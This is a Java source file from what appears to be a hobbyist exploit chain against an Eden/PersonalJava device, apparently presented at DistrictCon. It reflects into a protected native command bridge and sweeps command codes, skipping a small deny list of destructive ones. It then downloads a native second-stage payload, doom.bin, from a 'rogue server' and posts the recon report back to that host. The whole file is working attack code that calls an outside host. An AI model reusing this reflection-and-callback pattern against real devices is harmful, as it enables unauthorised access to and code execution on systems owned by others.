package org.junkyard;

import com.planetweb.eden.client.Eden;
import com.planetweb.eden.client.system.SystemInterface;
import com.planetweb.eden.client.service.Service;
import com.planetweb.eden.client.service.ServiceInfo;
import java.lang.reflect.Method;

/**
 * CHAIN "native": stage-1 recon toward NATIVE (full-speed) DOOM.
 *
 * The whole native engine is driven from Java through ONE choke point:
 *   NativeSystemInterface.sendCommand(int cmd, Object, Object)  (native)
 * reached via the protected SystemInterface.sendMessage(int,Object,Object).
 * With no SecurityManager we reflect into it and sweep command codes, recording
 * each return/exception/timing, then POST the map back to the rogue server.
 * That map is what we mine for a memory-corruption / code-exec primitive to
 * jump to a KallistiOS DOOM binary (staged here as /doom.bin).
 *
 * Destructive codes are denylisted (100 = write FLASH, 111 = setSecurityFile).
 * Class v45.3 (PersonalJava 1.1.8).
 */
public class NativeProbe extends Service {

    static final int LO = 0, HI = 1100;          // sweep range
    static final int[] DENY = { 100, 111 };       // never auto-fire these

    public ServiceInfo getInfo() { return new ServiceInfo("JunkyardNative", "1.0", "DistrictCon", Junk.BASE); }

    public void run() {
        Junk.banner("CHAIN native -- sendCommand bridge recon (-> native DOOM)");
        Junk.prove();
        try {
            SystemInterface si = Eden.getSystemInterface();
            Method m = SystemInterface.class.getDeclaredMethod(
                "sendMessage", new Class[]{ Integer.TYPE, Object.class, Object.class });
            m.setAccessible(true);

            StringBuffer rpt = new StringBuffer();
            rpt.append("# sendCommand sweep ").append(LO).append("..").append(HI).append("\n");
            Object[] args = new Object[3];
            for (int code = LO; code <= HI; code++) {
                if (deny(code)) { rpt.append(code).append("\tSKIP(deny)\n"); continue; }
                args[0] = new Integer(code); args[1] = null; args[2] = null;
                String line;
                try {
                    Object r = m.invoke(si, args);
                    line = code + "\tOK\t" + (r == null ? "null" : r.getClass().getName());
                } catch (Throwable t) {
                    Throwable c = t;                 // unwrap InvocationTargetException
                    try { java.lang.reflect.InvocationTargetException ite =
                          (java.lang.reflect.InvocationTargetException) t; c = ite.getTargetException(); }
                    catch (Throwable ig) {}
                    line = code + "\tEX\t" + c.getClass().getName();
                }
                rpt.append(line).append("\n");
            }

            // stage the native second-stage payload (proves we can fetch it)
            try {
                byte[] doom = Junk.httpGet(Junk.BASE + "/doom.bin");
                rpt.append("# staged doom.bin bytes=").append(doom.length).append("\n");
                Eden.println("[+] staged native payload: " + doom.length + " bytes");
            } catch (Throwable t) {
                rpt.append("# doom.bin not available: ").append(t).append("\n");
            }

            Eden.println("[*] posting sweep report to " + Junk.BASE + "/report");
            Junk.httpPost(Junk.BASE + "/report", rpt.toString());
            Eden.println("[+] native recon complete -- see server /report log");
        } catch (Throwable t) {
            Eden.println("[!] native probe failed: " + t);
            t.printStackTrace();
        }
    }

    static boolean deny(int code) {
        for (int i = 0; i < DENY.length; i++) if (DENY[i] == code) return true;
        return false;
    }
}
